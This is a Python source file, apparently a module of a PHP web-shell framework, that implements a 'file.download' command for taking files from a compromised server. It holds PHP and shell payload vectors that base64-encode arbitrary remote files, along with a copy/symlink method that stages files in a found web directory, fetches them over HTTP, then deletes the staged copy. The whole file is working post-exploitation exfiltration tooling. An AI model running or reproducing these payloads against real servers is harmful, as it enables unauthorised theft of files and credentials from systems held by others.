'''
Created on 24/ago/2011

@author: norby
'''
from core.moduleprobeall import ModuleProbeAll
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from random import randint
from core.vector import VectorList, Vector as V
from core.savedargparse import SavedArgumentParser as ArgumentParser

class Download(ModuleProbeAll):
    '''Download binary/ascii files from target filesystem
:file.download <remote path> <locale path>
    '''

    vectors = VectorList([
        V('shell.php', 'file', "print(@base64_encode(implode('', file('$rpath'))));"),
        V('shell.php', 'fread', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
        V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('$rpath')));"),
        V('shell.sh',  "base64", "base64 -w 0 $rpath"),
        V('shell.php', "copy", "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);"),
        V('shell.php',  "symlink", "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
    ])

    support_vectors = VectorList([
        V('file.check',  "check_readable", "$rpath read".split(' ')),
        V('find.webdir',  "find_webdir", ''),
        V('file.rm', 'remove', '$rpath'),
        V('file.check', 'md5', '$rpath md5'.split(' ')),
    ])

    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('rpath')
    argparser.add_argument('lpath')
    argparser.add_argument('-vector', choices = vectors.get_names())
    
    def _prepare_probe(self):
        self.transfer_dir = None

        self.lastreadfile = ''

    def _prepare_vector(self):
        
        remote_path = self.args['rpath']
        self.args_formats['rpath'] = self.args['rpath']
        
        # First check remote file existance
        
        if not self.support_vectors.get('check_readable').execute(self.modhandler, {'rpath' : remote_path}):
            raise ProbeException(self.name, '\'%s\', no such file or directory or permission denied' % remote_path)
         
        # Vectory copy and symlink needs to search a writable directory before
        
        if self.current_vector.name in ( 'copy', 'symlink' ):

                self.modhandler.set_verbosity(3)
                if not self.support_vectors.get('find_webdir').execute(self.modhandler):
                    self.modhandler.set_verbosity()
                    raise ExecutionException(self.current_vector.name,'No webdir found')
                
                self.modhandler.set_verbosity()

                self.transfer_url_dir = self.modhandler.load('find.webdir')._result[0]
                self.transfer_dir = self.modhandler.load('find.webdir')._result[1]

                if not self.transfer_url_dir or not self.transfer_dir:
                    raise ExecutionException(self.current_vector.name,'No transfer url dir found')

                filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
                self.args_formats['downloadpath'] = self.transfer_url_dir + filename
                self.url = self.transfer_dir + filename
                
            
                

    def _execute_vector(self):
        
        output = self.current_vector.execute(self.modhandler, self.args_formats)
        
        if self.current_vector.name in ('copy', 'symlink'):

            if self.support_vectors.get('check_readable').execute(self.modhandler, {'rpath' : self.args_formats['downloadpath']}):
                self._result = Request(self.url).read()
                # Force deleting. Does not check existance, because broken links returns False
            
            self.support_vectors.get('remove').execute(self.modhandler, {'rpath' : self.args_formats['downloadpath']})
            
        else:
            # All others encode data in b64 format
            
            try:
                self._result = b64decode(output)
            except TypeError:
                raise ExecutionException(self.current_vector.name,"Error, unexpected file content")


    def _verify_execution(self):

        remote_path = self.args['rpath']
        local_path = self.args['lpath']

        try:
            f = open(local_path,'wb')
            f.write(self._result)
            f.close()
        except Exception, e:
            raise ProbeException(self.name, 'Writing %s' % (e))

        response_md5 = md5(self._result).hexdigest()
        remote_md5 = self.support_vectors.get('md5').execute(self.modhandler, {'rpath' : self.args_formats['rpath']})

        # Consider as probe failed only MD5 mismatch
        if not remote_md5 == response_md5:
            
            if self.current_vector.name in ('copy', 'symlink') and not self.args_formats['downloadpath'].endswith('.html') and not self.args_formats['downloadpath'].endswith('.htm'):
                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (self.url))

            raise ExecutionException(self.current_vector.name,'MD5 hash of \'%s\' file mismatch, file corrupted' % ( local_path))
        
        elif not remote_md5:
            self.mprint('MD5 check failed')
        
        raise ProbeSucceed(self.name, 'File downloaded to \'%s\'.' % (local_path))
    
    
    
    def _output_result(self):
        # Not convert self._result to self._output (no output prints)
        self._output = ''
    
